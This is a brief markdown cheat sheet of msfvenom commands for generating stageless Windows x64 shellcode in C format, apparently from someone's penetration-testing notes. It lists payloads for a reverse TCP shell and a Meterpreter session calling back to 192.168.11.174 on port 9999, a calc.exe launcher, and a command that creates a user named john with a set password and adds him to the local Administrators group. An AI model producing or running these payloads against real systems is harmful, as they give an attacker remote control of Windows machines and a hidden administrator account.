# x64 Stageless

reverse tcp
```sh
msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.11.174 LPORT=9999 -f c
```

meterpreter
```sh
msfvenom -a x64 --platform windows -p windows/x64/meterpreter_reverse_tcp  LHOST=192.168.11.174 LPORT=9999 -f c
```

calc
```sh
msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe -f c
```

add user to local admin group
```sh
msfvenom -a x64 --platform windows -p windows/x64/exec CMD="net user john Mdp@Secure123 /add;net localgroup Administrators john /add" -f c
```